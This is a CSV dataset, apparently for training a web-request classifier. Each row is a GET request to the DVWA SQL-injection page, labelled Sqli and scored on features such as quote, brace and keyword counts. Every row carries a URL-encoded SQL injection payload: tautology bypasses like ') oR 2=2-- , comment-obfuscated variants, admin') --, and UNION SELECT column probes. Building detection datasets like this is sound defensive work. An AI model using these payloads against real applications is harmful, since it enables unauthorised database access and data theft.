Method,Path,Body,Single Quotes,Double Quotes,Dashes,Braces,Spaces,Tags,Colons,Backtick,Bad Words,XSS Check,XSS Word,Cmdi Word,Cmdi Check,Class
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29oR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,2,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%202--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%202%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%202%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%202%20oR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2f2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2f2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2f2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2f2%2f%2A%2A%2foR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%28%222&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,1,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22oR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,1,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29oR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,2,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%202--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%202%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%202%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%202%20oR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%2f%2A%2A%2f2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%2f%2A%2A%2f2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%2f%2A%2A%2f2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%2f%2A%2A%2f2%2f%2A%2A%2foR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27%3D%28%272&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27%3D%272%27oR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,6,0,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27%3D%272%27--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27%3D%272%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27%3D%272%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%202%3D2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%202%3D2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%202%3D2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%202%3D2%20oR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2f2%3D2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2f2%3D2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2f2%3D2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2f2%3D2%2f%2A%2A%2foR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29%3D2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,1,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29%3D2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29%3D2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29%3D%282%29oR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,3,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27%3D%272%27%20LimIT%201--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,0,3,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27%3D%272%27%20LimIT%201%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27%3D%272%27%20LimIT%201%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29%3D%282%29LimIT%281%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,3,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29%3D%282%29LimIT%281%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,3,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29%3D%282%29LimIT%281%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,3,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22%3D%28%222&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22%3D%222%22oR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,6,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22%3D%222%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,1,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22%3D%222%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22%3D%222%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%202%3D2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%202%3D2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%202%3D2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%202%3D2%20oR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%2f%2A%2A%2f2%3D2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%2f%2A%2A%2f2%3D2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%2f%2A%2A%2f2%3D2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%2f%2A%2A%2f2%3D2%2f%2A%2A%2foR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29%3D2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,1,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29%3D2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29%3D2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29%3D%282%29oR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,3,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22%3D%222%22%20LimIT%201--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,1,0,3,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22%3D%222%22%20LimIT%201%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22%3D%222%22%20LimIT%201%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29%3D%282%29LimIT%281%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,3,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29%3D%282%29LimIT%281%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,3,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29%3D%282%29LimIT%281%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,3,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%20true--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%20true%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%20true%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%20true%20oR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%28true%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,1,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%28true%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%28true%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%28true%29oR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,2,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2ftrue--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2ftrue%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2ftrue%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2ftrue%2f%2A%2A%2foR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%20true--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%20true%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%20true%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%20true%20oR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%28true%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,1,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%28true%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%28true%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%28true%29oR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,2,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%2f%2A%2A%2ftrue--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%2f%2A%2A%2ftrue%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%2f%2A%2A%2ftrue%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%2f%2A%2A%2ftrue%2f%2A%2A%2foR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27LiKE%28%272&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27LiKE%272%27--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27LiKE%272%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27LiKE%272%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27LiKE%272%27oR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,6,0,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29LiKE%282%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,2,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29LiKE%282%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29LiKE%282%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29LiKE%282%29oR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,3,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22LiKE%28%222&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22LiKE%222%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,1,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22LiKE%222%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22LiKE%222%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22LiKE%222%22oR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,6,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29LiKE%282%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,2,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29LiKE%282%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,2,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29LiKE%282%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,2,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29LiKE%282%29oR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,3,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20UniON%20SElecT%201%2C2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,4,0,0,0,3,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20UniON%20SElecT%201%2C2%2C3--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,4,0,0,0,3,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20UniON%20SElecT%201%2C2%2C3%2C4--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,4,0,0,0,3,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20UniON%20SElecT%201%2C2%2C3%2C4%2C5--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,4,0,0,0,3,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20UniON%20SElecT%201%2C2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,3,0,0,0,3,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20UniON%20SElecT%201%2C2%2C3%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,3,0,0,0,3,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20UniON%20SElecT%201%2C2%2C3%2C4%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,3,0,0,0,3,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20UniON%20SElecT%201%2C2%2C3%2C4%2C5%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,3,0,0,0,3,0,0,1,6,Sqli
